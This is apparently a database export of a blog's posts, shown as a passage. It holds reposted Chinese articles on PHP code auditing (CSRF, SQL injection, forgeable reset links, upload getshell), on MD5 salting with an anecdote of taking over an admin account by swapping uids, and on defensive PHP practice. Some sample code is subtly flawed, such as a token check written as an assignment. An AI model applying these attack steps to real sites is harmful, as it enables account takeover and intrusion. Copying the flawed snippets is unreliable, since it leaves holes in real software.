&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$query2121&nbsp;=&nbsp;&quot;select&nbsp;ROLE&nbsp;from&nbsp;{$db_prefix}members&nbsp;WHERE&nbsp;ID=&#39;$del_id&#39;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result2121&nbsp;=&nbsp;mysql_query($query2121)&nbsp;or&nbsp;die(&quot;delete.php&nbsp;-&nbsp;Error&nbsp;in&nbsp;query:&nbsp;$query2121&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;($results2121&nbsp;=&nbsp;mysql_fetch_array($result2121))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$their_role&nbsp;=&nbsp;$results2121[&#39;ROLE&#39;];
}
if&nbsp;($their_role&nbsp;!=&nbsp;&#39;1&#39;)&nbsp;{
mysql_query(&quot;DELETE&nbsp;FROM&nbsp;{$db_prefix}members&nbsp;WHERE&nbsp;id=&#39;$del_id&#39;&quot;)&nbsp;
or&nbsp;die(mysql_error());</pre><p>关键是在于操作没有任何类型的确认，只要提交请求即可见效</p><pre class=\\"highlight\\">http://127.0.0.1/index.php?page=admin&amp;act=members&amp;func=delete&amp;id=4</pre><p>如何修补：token</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;check_auth();
&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_GET[&#39;news&#39;])&nbsp;&amp;&amp;&nbsp;$token=$_SESSION[&#39;token&#39;])
&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;unlink(&#39;files/news&#39;.$news.&#39;.txt&#39;);&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;die(&#39;Error.&#39;);&nbsp;}
?&gt;</pre><p>这样就不能伪造啦</p><pre class=\\"highlight\\">http://127.0.0.1/index.php?delete=1&amp;token=[RANDOM_TOKEN]</pre><p>挖掘方法：敏感功能如 “添加管理员” “修改密码” “直接把shell地址给到别人邮箱里”观察是否有token验证或者其他形式的验证</p><h2>0x10 参考文献</h2><hr/><p>部分内容参考自【英文】 <a href=\\"http://www.exploit-db.com/papers/12871/\\">http://www.exploit-db.com/papers/12871/</a> Name : Finding vulnerabilities in PHP scripts FULL ( with examples ) Author : SirGod Email : sirgod08@gmail.com</p><p>lxj616@wooyun 引用处进行了翻译</p><p>以下是最新自己发现的例子</p><h2>0x11 CSCMS V3.5 最新版 SQL注射（官方站演示+源码详析）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2013-047363\\" target=\\"_blank\\">WooYun: CSCMS V3.5 最新版 SQL注射（官方站演示+源码详析）</a></p><p>PS：CSCMS真是好教材……</p><p>感谢 @五道口杀气 在上一篇的回复：</p><pre class=\\"highlight\\">MVC的代码看一下框架本身实现有没有问题，然后去看model就行了，model有多强，决定了有多大的空间，而变量的过滤在controller里调用时应该几乎是差不多的，所以这类代码从index.php开始读可能也不是太有必要</pre><p>经过仔细的琢磨，我有了更深的体会，比如本次漏洞中，CSCMS重构了代码，使用了MVC架构，果然是model的xss_clean被误用（或者
 
说model根本没有防范注射的功能），导致controller里面射成一片，因此可以说我之前的“从index.php开始“很不恰当，应当视情况而
 定</p><p>感谢 @erevus 在上一篇的回复：</p><pre class=\\"highlight\\">我说说的我经验 &nbsp;&nbsp;&nbsp;&nbsp;挖SQL注入，全局搜索select,insert,updata这几个关键字&nbsp;然后找到SQL语句&nbsp;向上跟&nbsp;跟到传入变量的地方&nbsp;看看中途有没有过滤 &nbsp;&nbsp;&nbsp;&nbsp;挖任意代码执行，全局搜索各种可以执行命令的函数，然后也是一个个看&nbsp;向上跟.（一直没挖到...） &nbsp;&nbsp;&nbsp;&nbsp;挖XSS...直接黑盒挖，看看有没有过滤&nbsp;过滤了的话就去看过滤的代码是怎样&nbsp;然后看看能不能绕...感觉如果是框架的话，只搜索SELECT关键字可能会有遗漏，因为有很多都是比如：

$member-&gt;where&nbsp;(&nbsp;&quot;username&nbsp;=&#39;&quot;&nbsp;.&nbsp;$username&nbsp;.&nbsp;&quot;&#39;&quot;&nbsp;)-&gt;save&nbsp;(&nbsp;$arr_i&nbsp;);&nbsp;//&nbsp;更新状态</pre><p>这样的框架很容易遗漏重要拼接</p><p>PS:强烈同意erevus的XSS的挖掘方法，因为能力和精力都很有限……</p><h2>0x12 MacCMS 全版本通杀SQL注射（包括最新7.x）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2014-048553\\" target=\\"_blank\\">WooYun: MacCMS 全版本通杀SQL注射（包括最新7.x）</a></p><p>也是重构了代码，加入了360的防护脚本，其实在我发上一个漏洞（6.x）时这个7.x刚好发布，我稍微看了一眼，发现有360防护脚本后就不看了，以为他们肯定全都过滤掉了，直到…… 比较有趣的是他们根本没有在referer上使用360的获取方式，而是直接<code>return $_SERVER[&quot;HTTP_REFERER&quot;];</code> 了 因此提醒大家，代码审计就是要仔细，就是要有超人般的耐心，不要想当然。</p><h2>0x13 WanCMS 可修改任意用户密码（源码详析+实例演示）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2014-049284\\" target=\\"_blank\\">WooYun: WanCMS 可修改任意用户密码（源码详析+实例演示）</a></p><p>我终于又发现了一个敏感业务逻辑上的漏洞</p><p>唠叨两句密码学……</p><p>MD5、SHA 是哈希函数，知道$a后容易知道md5($a)，而知道md5($a)难以恢复$a Des 是对称密码，加解密使用同一个密钥</p><pre class=\\"brush:php;toolbar:false\\">$reurl&nbsp;=&nbsp;$config&nbsp;[&#39;DOMAIN&#39;]&nbsp;.&nbsp;&#39;/accounts/forget_password_t?vc=&#39;&nbsp;.&nbsp;md5&nbsp;(&nbsp;md5&nbsp;(&nbsp;$username&nbsp;)&nbsp;);</pre><p>这里的密码重置链接 使用的是MD5（两遍），但是用户名我们是知道的，因此直接就能伪造，这也说明了md5并不是用来加密的，应该用DES或者……更常见的方法是MD5中的用户名再加入密码和随机数，或者干脆随机一串字符好了。</p><h2>0x14 WanCMS 多处SQL注射（源码详析+实站演示）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2014-049372\\" target=\\"_blank\\">WooYun: WanCMS 多处SQL注射（源码详析+实站演示）</a></p><p>又是一个框架中注射的例子</p><pre class=\\"brush:php;toolbar:false\\">$u_info&nbsp;=&nbsp;$member-&gt;where&nbsp;(&nbsp;&quot;username&nbsp;=&#39;&quot;&nbsp;.&nbsp;$username&nbsp;.&nbsp;&quot;&#39;&quot;&nbsp;)-&gt;find&nbsp;();</pre><p>之前username没有过滤，虽然看着和带着SELECT的完整SQL语句有区别，但是效果是一样的</p><h2>0x15 CSCMS V3.5 最新补丁后 又一个SQL注射（源码详析）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2014-050942\\" target=\\"_blank\\">WooYun: CSCMS V3.5 最新补丁后 又一个SQL注射（源码详析）</a></p><p>这个就是一个厂商漏补的addslash+无引号 盲注 但是比较有新意的是，他们好像有一阵是用的magic_quotes_gpc来处理的，只是给数字补上了好多的引号，而且还漏了几个……</p><p>0x16 TCCMS （最新）8.0 后台GETSHELL （源码详析）</p><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2014-050834\\" target=\\"_blank\\">WooYun: TCCMS （最新）8.0 后台GETSHELL （源码详析）</a></p><p>任意文件上传，前提是upload为ON</p><pre class=\\"brush:php;toolbar:false\\">$fullPath&nbsp;=&nbsp;$path&nbsp;.&nbsp;&quot;/&quot;&nbsp;.&nbsp;$_POST[&quot;name&quot;];</pre><p>居然直接从POST里面取。</p><p>一般情况下应该是uuid随机数名称，或者至少去不可见字符强加后缀。</p><p>直接从POST中取值的下场就是任意文件上传。</p><h2>0x17 iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）</h2><hr/><p><a href=\\"http://www.wooyun.org/bugs/wooyun-2013-046702\\" target=\\"_blank\\">WooYun: iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）</a></p><p>这个注射有一个特别之处，就是过滤了逗号（，），因此跑表时非常不顺利，需要想其他的方法来验证危害</p><pre class=\\"brush:php;toolbar:false\\">$tos&nbsp;=&nbsp;explode(&#39;,&#39;,trim($arr[&#39;to&#39;]));</pre><p>没错，这一句干掉了逗号</p><p>解决方案：不跑表了，试着构造错误回显（因为常规那页面是没有回显的）直接爆管理员密码</p><p>思路总结：变量到达第一个注射语句没有逗号无法突破无法回显，坚持继续读，程序能继续运行，然后发现下面还有一句也会被注射到，然后注射到的结果又拼接到另一个SQL语句中，而报错又是开启状态，因此构造一下在SQL报错的地方回显出密码。</p><p>&nbsp;</p><p>文章转自：http://drops.wooyun.org/tips/858</p><p><br/></p>',
            'keyword' => 'PHP漏洞',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:19:28',
          ),
          69 => 
          array (
            'id' => '16',
            'uid' => '1',
            'title' => '（转载）浅谈MD5加密算法中的加盐值(SALT)',
            'content' => '<p>&nbsp;&nbsp;&nbsp;&nbsp;我们知道，如果直接对密码进行散列，那么黑客可以对通过获得这个密码散列值，然后通过查散列值字典（例如MD5密码破解网站），得到某用户的密码。</p><p>　　加Salt可以一定程度上解决这一问题。所谓加Salt方法，就是加点“佐料”。其基本想法是这样的：当用户首次提供密码时（通常是注册时），
 
由系统自动往这个密码里撒一些“佐料”，然后再散列。而当用户登录时，系统为用户提供的代码撒上同样的“佐料”，然后散列，再比较散列值，已确定密码是否
 正确。</p><p>　　这里的“佐料”被称作“Salt值”，这个值是由系统随机生成的，并且只有系统知道。这样，即便两个用户使用了同一个密码，由于系统为它们生成
 
的salt值不同，他们的散列值也是不同的。即便黑客可以通过自己的密码和自己生成的散列值来找具有特定密码的用户，但这个几率太小了（密码和salt值
 都得和黑客使用的一样才行）。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;下面以PHP示例，讲解md5($pass.$salt)加密函数。</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
function&nbsp;hash($a)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$salt=”Random_KUGBJVY”;&nbsp;&nbsp;//定义一个salt值，程序员规定下来的随机字符串
&nbsp;&nbsp;&nbsp;&nbsp;$b=$a.$salt;&nbsp;&nbsp;//把密码和salt连接
&nbsp;&nbsp;&nbsp;&nbsp;$b=md5($b);&nbsp;&nbsp;//执行MD5散列
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$b;&nbsp;&nbsp;//返回散列&nbsp;&nbsp;&nbsp;&nbsp;
}
?&gt;</pre><p>调用方式：<span style=\\"color: #ff0000;\\">$new_password=<span style=\\"color: #ff0000;\\">hash($_POST[password]);&nbsp;&nbsp; <span style=\\"color: #008080;\\">//这里接受表单提交值，并进行加密</span></span></span></p><p>　　下面详细介绍一下加Salt散列的过程。介绍之前先强调一点，前面说过，验证密码时要使用和最初散列密码时使用“相同的”佐料。所以Salt值是要存放在数据库里的。</p><p>用户注册时，</p><ol><li><p>用户输入【账号】和【密码】（以及其他用户信息）；</p></li><li><p>系统为用户生成【Salt值】；</p></li><li><p>系统将【Salt值】和【用户密码】连接到一起；</p></li><li><p>对连接后的值进行散列，得到【Hash值】；</p></li><li><p>将【<span style=\\"color: #ff0000;\\">Hash值1】和【Salt值】分别放到数据库中。</span></p></li></ol><p>用户登录时，</p><ol><li><p>用户输入【账号】和【密码】；</p></li><li><p>系统通过用户名找到与之对应的【Hash值】和【Salt值】；</p></li><li><p>系统将【Salt值】和【用户输入的密码】连接到一起；</p></li><li><p>对连接后的值进行散列，得到【<span style=\\"color: #ff0000;\\">Hash值2】（注意是即时运算出来的值）；</span></p></li><li><p>比较【Hash值<span style=\\"color: #ff0000;\\">1】和【Hash值<span style=\\"color: #ff0000;\\">2】是否相等，相等则表示密码正确，否则表示密码错误。</span></span></p></li></ol><p>有时候，为了减轻开发压力，程序员会统一使用一个salt值（储存在某个地方），而不是每个用户都生成私有的salt值。</p><p>&nbsp;</p><p>您是否遇见过破解不了的MD5值？你是否遇见过‘奇形怪状’的hash？这些非常有可能就是带有salt（俗称加盐值），本文将为大家简单的介绍关于加盐值的一些信息。</p><p>0×01. 什么是加盐值?<br/>为了加强MD5的<a href=\\"http://www.hackline.net/\\">安全</a>性（本身是不可逆的），从而加入了新的算法部分即加盐值，加盐值是随机生成的一组字符串，可以包括随机的大小写字母、数字、字符，位数可以根据要求而不一样，使用不同的加盐值产生的最终密文是不一样的。</p><p>&nbsp;</p><p>0×02. 代码中如何使用加盐值?<br/>由于使用加盐值以后的密码相当的安全，即便是你获得了其中的salt和最终密文，破解也是一个耗费相当多时间的过程，可以说是破解单纯MD5的好几倍，那么使用加盐值以后的密文是如何产生的呢？<br/>1).首先我们得到的是明文的hash值<br/>2).进行计算获取MD5明文hash值<br/>3).随机生成加盐值并插入<br/>4).MD5插入加盐值得到的hash<br/>5).得到最终的密文</p><p>&nbsp;</p><p>0×03. 如何破解出带有加盐值的密文<br/>因为像<a href=\\"http://www.hackline.net/a/school/xtrm/\\">windows</a>
 hash（未进行syskey加密）、非加盐值MD5等都可以通过大型的密码（如彩虹表）表进行对比解密，所以相对而言相当的轻松，而带有加盐值的密文就
相对而言复杂的多，现在的MD5表大概是260+G，如何加盐值的可能性有10000个，那么密码表的应该是MD5 
size*10000，就可以解密出原MD5表能够解密的密码了，一些网站也提供了对应的salt解密，但是测试以后效果并不是非常好，如常规的
admin888也未解密出，实在是遗憾，毕竟MD5本是不可逆的，带入随机值解密出最终密码的可能性就更低了，至少是相对大多数人而言的。</p><p>&nbsp;</p><p>0×04. 含加盐值MD5算法的应用<br/>目前多家的网站程序公司都已经加入了该算法，如常见的VBB论坛、discuz论坛等都采用了，甚至著名的Linux开源操作系统早已经加入了这种加密模式。可得而知，这种算法势必会在未来应用于更多的范围。</p><p>&nbsp;</p><p>*0×05. 如何<a href=\\"http://www.hackline.net/a/special/wlgf/jbst/\\">渗透</a>带有加盐值的站点(实际案例)？<br/>这
一段信息是来源于我近日实际渗透的片段，由于通过多种途径无法解密带有加盐值的密文，所以只能通过其他方式进行突破，本欲修改管理员密码来进行操作，但站
点是通过多个网站对比密码的形式，如站A和站B，我如果修改站A的密码，一旦对比站A和站B，那么将会提示无法登陆，因为我只拥有一个站的管理权限，那么
这样就非常的麻烦了，一是密文无法破解，而是修改密码无效。那么我们应该如何处理呢？这里简述下本人在这里应用的方法：<br/>1).修改admin uid为没有启用的某值<br/>2).将自己的注册用户修改为admin uid的值<br/>重新登陆，并成功获取权限，因为在站A中式依据uid来分配权限的，也就是给某uid管理员权限，如何而言轻松获取到管理员权限。</p><p>&nbsp;</p><p>转载：http://blog.csdn.net/blade2001/article/details/6341078</p><p><br/></p>',
            'keyword' => 'MD5,加密,加盐值,SALT',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 11:38:50',
          ),
          70 => 
          array (
            'id' => '15',
            'uid' => '1',
            'title' => '（转载）浅谈php安全',
            'content' => '<p>这段时间一直在写一个整站，前几天才基本完成了，所以抽个时间写了一篇对于php安全的总结。技术含量不高，过不了也没关系，希望能一些准备写网站的朋友一点引导。</p><p><span style=\\"color: #00b050;\\">在放假之初，我抽时间看了《白帽子讲web安全》，吴翰清基本上把web安全中所有能够遇到的问题、解决思路归纳总结得很清晰，也是我这一次整体代码安全性的基石。</span></p><p>我希望能分如下几个方面来分享自己的经验</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>把握整站的结构，避免泄露站点敏感目录</strong><br/></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;在写代码之初，我也是像很多老源码一样，在根目录下放上index.php、register.php、login.php，用户点击注册
页面，就跳转到http://localhost/register.php。并没有太多的结构的思想，像这样的代码结构，最大的问题倒不是安全性问题，
而是代码扩展与移植问题。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在写代码的过程中，我们常要对代码进行修改，这时候如果代码没有统一的一个入口点，我们可能要改很多地方。后来我读了一点emlog的代码，发现网站真正的前端代码都在模板目录里，而根目录下就只有入口点文件和配置文件。这才顿悟，对整个网站的结构进行了修改。</p><p>&nbsp; &nbsp; 
网站根目录下放上一个入口点文件，让它来对整个网站所有页面进行管理，这个时候注册页面变成了http://localhost
/?act=register，任何页面只是act的一个参数，在得到这个参数后，再用一个switch来选择要包含的文件内容。在这个入口点文件中，还
可以包含一些常量的定义，比如网站的绝对路径、网站的地址、数据库用户密码。以后我们在脚本的编写中，尽量使用绝对路径而不要使用相对路径（否则脚本如果
改变位置，代码也要变），而这个绝对路径就来自入口点文件中的定义。</p><p>&nbsp; &nbsp; 
当然，在安全性上，一个入口点文件也能隐藏后台地址。像这样的地址http://localhost/?act=xxx不会暴露后台绝对路径，甚至可以经
常更改，不用改变太多代码。一个入口点文件也可以验证访问者的身份，比如一个网站后台，不是管理员就不允许查看任何页面。在入口点文件中就可以验证身份，
如果没有登录，就输出404页面。</p><p>&nbsp; &nbsp; 有了入口点文件，我就把所有非入口点文件前面加上了这句话：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php&nbsp;if(!defined(&#39;WWW_ROOT&#39;))&nbsp;{header(&quot;HTTP/1.1&nbsp;404&nbsp;Not&nbsp;Found&quot;);&nbsp;exit;}&nbsp;?&gt;</pre><p>WWW_ROOT是我在入口点中定义的一个常量，如果用户是通过这个页面的绝对路径访问（http://localhost 
/register.php），我就输出404错误；只有通过入口点访问（http://localhost/?act=register），才能执行后
 面的代码。 &nbsp; &nbsp;</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>使用预编译语句，避免sql注入</strong></span></p><p>&nbsp; &nbsp; 注入是早前很大的一个问题，不过近些年因为大家比较重视这个问题，所以慢慢变得好了很多。</p><p>&nbsp; &nbsp; 
吴翰清在web白帽子里说的很好，其实很多漏洞，像sql注入或xss，都是将“数据”和“代码”没有区分开。“代码”是程序员写的内容，“数据”是用户
 可以改变的内容。如果我们写一个sql语句select * from admin where username=&#39;admin&#39; 
password=&#39;xxxxx&#39;, 
admin和xxxxx就是数据，是用户输入的用户名和密码，但如果没有任何处理，用户输入的就可能是“代码”，比如&#39;or 
&#39;&#39;=&#39;，这样就造成了漏洞。“代码”是绝对不能让用户接触的。</p><p>&nbsp; &nbsp; 在php中，对于mysql数据库有两个模块，mysql和mysqli，mysqli的意思就是mysql 
improve。mysql的改进版，这个模块中就含有“预编译”这个概念。像上面那个sql语句，改一改：select * from admin 
where username=&#39;?&#39; 
password=&#39;?&#39;，它就不是一个sql语句了，但是可以通过mysqli的预编译功能先把他编译成stmt对象，在后期用户输入账号密码后，用 
stmt-&gt;bind_param将用户输入的“数据”绑定到这两个问号的位置。这样，用户输入的内容就只能是“数据”，而不可能变成“代码”。</p><p>&nbsp; &nbsp; 这两个问号限定了“数据”的位置，以及sql语句的结构。我们可以把我们所有的数据库操作都封装到一个类中，所有sql语句的执行都进行预编译。这样就完全避免了sql注入，这也是吴翰清最推荐的解决方案。</p><p>&nbsp; &nbsp; 下面是使用mysqli的一些代码部分(所有的判断函数运行成功或失败的代码我都省略了，但不代表不重要)：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
&nbsp;&nbsp;&nbsp;&nbsp;//用户输入的数据
&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;&#39;admin&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;$pass&nbsp;=&nbsp;&#39;123456&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;//首先新建mysqli对象,构造函数参数中包含了数据库相关内容。
&nbsp;&nbsp;&nbsp;&nbsp;$conn&nbsp;=&nbsp;new&nbsp;mysqli(DB_HOST,&nbsp;DB_USER,&nbsp;DB_PASS,&nbsp;DB_NAME,&nbsp;DB_PORT);
&nbsp;&nbsp;&nbsp;&nbsp;//设置sql语句默认编码
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;mysqli-&gt;set_charset(&quot;utf8&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;//创建一个使用通配符的sql语句
&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&#39;SELECT&nbsp;user_id&nbsp;FROM&nbsp;admin&nbsp;WHERE&nbsp;username=?&nbsp;AND&nbsp;password=?;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;//编译该语句，得到一个stmt对象.
&nbsp;&nbsp;&nbsp;&nbsp;$stmt&nbsp;=&nbsp;$conn-&gt;prepare($sql);
&nbsp;&nbsp;&nbsp;&nbsp;/********************之后的内容就能重复利用，不用再次编译*************************/
&nbsp;&nbsp;&nbsp;&nbsp;//用bind_param方法绑定数据
&nbsp;&nbsp;&nbsp;&nbsp;//大家可以看出来，因为我留了两个?，也就是要向其中绑定两个数据，所以第一个参数是绑定的数据的类型(s=string,i=integer)，
&nbsp;&nbsp;&nbsp;&nbsp;//第二个以后的参数是要绑定的数据$stmt-&gt;bind_param(&#39;ss&#39;,&nbsp;$name,&nbsp;$pass);
&nbsp;&nbsp;&nbsp;&nbsp;//调用bind_param方法绑定结果（如果只是检查该用户与密码是否存在，或只是一个DML语句的时候，不用绑定结果）
&nbsp;&nbsp;&nbsp;&nbsp;//这个结果就是我select到的字段，有几个就要绑定几个$stmt-&gt;bind_result($user_id);
&nbsp;&nbsp;&nbsp;&nbsp;//执行该语句$stmt-&gt;execute();
&nbsp;&nbsp;&nbsp;&nbsp;//得到结果
&nbsp;&nbsp;&nbsp;&nbsp;if($stmt-&gt;fetch()){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;登陆成功&#39;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//一定要注意释放结果资源，否则后面会出错&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$stmt-&gt;free_result();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$user_id;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//返回刚才select到的内容
&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&#39;登录失败&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;}
?&gt;</pre><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>预防XSS代码，如果不需要使用cookie就不使用</strong></span></p><p>&nbsp; &nbsp; 在我的网站中并没有使用cookie，更因为我对权限限制的很死，所以对于xss来说危险性比较小。</p><p>&nbsp; &nbsp; 
对于xss的防御，也是一个道理，处理好“代码”和“数据”的关系。当然，这里的代码指的就是javascript代码或html代码。用户能控制的内 
容，我们一定要使用htmlspecialchars等函数来处理用户输入的数据，并且在javascript中要谨慎把内容输出到页面中。</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>限制用户权限，预防CSRF</strong></span></p><p>&nbsp; &nbsp; 现在脚本漏洞比较火的就是越权行为，很多重要操作使用GET方式执行，或使用POST方式执行而没有核实执行者是否知情。</p><p>&nbsp; &nbsp; CSRF很多同学可能比较陌生，其实举一个小例子就行了：</p><p>A、B都是某论坛用户，该论坛允许用户“赞”某篇文章，用户点“赞”其实是访问了这个页面：http://localhost 
/?act=support&amp;articleid=12。这个时候，B如果把这个URL发送给A，A在不知情的情况下打开了它，等于说给 
articleid=12的文章赞了一次。</p><p>&nbsp; &nbsp; 所以该论坛换了种方式，通过POST方式来赞某篇文章。</p><pre class=\\"brush:html;toolbar:false\\">&lt;form&nbsp;action=&quot;http://localhost/?act=support&quot;&nbsp;method=&quot;POST&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;hidden&quot;&nbsp;value=&quot;12&quot;&nbsp;name=&quot;articleid&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;赞&quot;&gt;
&lt;/form&gt;</pre><p>可以看到一个隐藏的input框里含有该文章的ID，这样就不能通过一个URL让A点击了。但是B可以做一个“极具诱惑力”的页面，其中某个按钮就写成这样一个表单，来诱惑A点击。A一点击，依旧还是赞了这篇文章。</p><p>&nbsp; &nbsp; 最后，该论坛只好把表单中增加了一个验证码。只有A输入验证码才能点赞。这样，彻底死了B的心。</p><p>&nbsp; &nbsp; 但是，你见过哪个论坛点“赞”也要输入验证码？</p><p>所以吴翰清在白帽子里也推荐了最好的方式，就是在表单中加入一个随机字符串token（由php生成，并保存在SESSION中），如果用户提交的这个随机字符串和SESSION中保存的字符串一致，才能赞。</p><p>&nbsp; &nbsp; 在B不知道A的随机字符串时，就不能越权操作了。</p><p>&nbsp; &nbsp; 我在网站中也多次使用了TOKEN，不管是GET方式还是POST方式，通常就能抵御99%的CSRF估计了。</p><p style=\\"margin-top: 15px;\\"><span style=\\"font-size: 18px;\\"><strong>严格控制上传文件类型</strong></span></p><p>&nbsp; &nbsp; 上传漏洞是很致命的漏洞，只要存在任意文件上传漏洞，就能执行任意代码，拿到webshell。</p><p>&nbsp; &nbsp; 我在上传这部分，写了一个php类，通过白名单验证，来控制用户上传恶意文件。在客户端，我通过javascript先验证了用户选择的文件的类型，但这只是善意地提醒用户，最终验证部分，还是在服务端。</p><p>&nbsp; &nbsp; 白名单是必要的，你如果只允许上传图片，就设置成array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;)，当用户上传来文件后，取它的文件名的后缀，用in_array验证是否在白名单中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在上传文件数组中，会有一个MIME类型，告诉服务端上传的文件类型是什么，但是它是不可靠的，是可以被修改的。在很多存在上传漏洞的网站中，都是只验证了MIME类型，而没有取文件名的后缀验证，导致上传任意文件。</p><p>&nbsp; &nbsp; 所以我们在类中完全可以忽略这个MIME类型，而只取文件名的后缀，如果在白名单中，才允许上传。</p><p>&nbsp; &nbsp; 当然，服务器的解析漏洞也是很多上传漏洞的突破点，所以我们尽量把上传的文件重命名，以“日期时间+随机数+白名单中后缀”的方式对上传的文件进行重命名，避免因为解析漏洞而造成任意代码执行。</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>加密混淆javascript代码，提高攻击门槛</strong></span></p><p>&nbsp; &nbsp; 很多xss漏洞，都是黑客通过阅读javascript代码发现的，如果我们能把所有javascript代码混淆以及加密，让代码就算解密后也是混乱的（比如把所有变量名替换成其MD5 hash值），提高阅读的难度。</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 18px;\\"><strong>使用更高级的hash算法保存数据库中重要信息</strong></span></p><p>&nbsp; &nbsp; 在这个硬盘容量大增的时期，很多人拥有很大的彩虹表，再加上类似于cmd5这样的网站的大行其道，单纯的md5已经等同于无物，所以我们迫切的需要更高级的hash算法，来保存我们数据库中的密码。</p><p>&nbsp; &nbsp; 所以后来出现了加salt的md5，比如discuz的密码就是加了salt。其实salt就是一个密码的“附加值”，比如A的密码是123456，而我们设置的salt是abc,这样保存到数据库的可能就是md5(&#39;123456abc&#39;)，增加了破解的难度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;但是黑客只要得知了该用户的salt也能跑md5跑出来。因为现在的计算机的计算速度已经非常快了，一秒可以计算10亿次md5值，弱一点的密码分把钟就能跑出来。</p><p>&nbsp; &nbsp; 
所以后来密码学上改进了hash，引进了一个概念：密钥延伸。说简单点就是增加计算hash的难度（比如把密码用md5()函数循环计算1000次），故
 
意减慢计算hash所用的时间，以前一秒可以计算10亿次，改进后1秒只能计算100万次，速度慢了1000倍，这样，所需的时间也就增加了1000倍。</p><p>&nbsp; &nbsp; 那么对于我们，怎么使用一个安全的hash计算方法？大家可以翻阅emlog的源码，可以在include目录里面找到一个HashPaaword.php的文件，其实这就是个类，emlog用它来计算密码的hash。</p><p>&nbsp; &nbsp; 这个类有一个特点，每次计算出的hash值都不一样，所以黑客不能通过彩虹表等方式破解密码，只能用这个类中一个checkpassword方法来返回用户输入密码的正确性。而该函数又特意增加了计算hash的时间，所以黑客很难破解他们拿到的hash值。</p><p>&nbsp; &nbsp; 在最新的php5.5中，这种hash算法成为了一个正式的函数，以后就能使用该函数来hash我们的密码了。</p><p style=\\"margin-top: 15px;\\"><span style=\\"color: #262626; font-size: 